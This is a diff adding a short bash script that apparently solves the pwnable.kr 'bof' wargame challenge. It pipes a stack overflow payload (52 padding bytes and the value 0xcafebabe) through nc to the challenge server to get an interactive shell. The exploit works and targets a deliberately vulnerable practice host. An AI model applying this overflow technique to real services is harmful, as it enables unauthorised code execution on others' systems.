@@ -1,0 +1,4 @@
+#!/bin/bash
+
+(python2 -c "print 'A'*52 + '\xbe\xba\xfe\xca'";cat) | nc pwnable.kr 9000
+
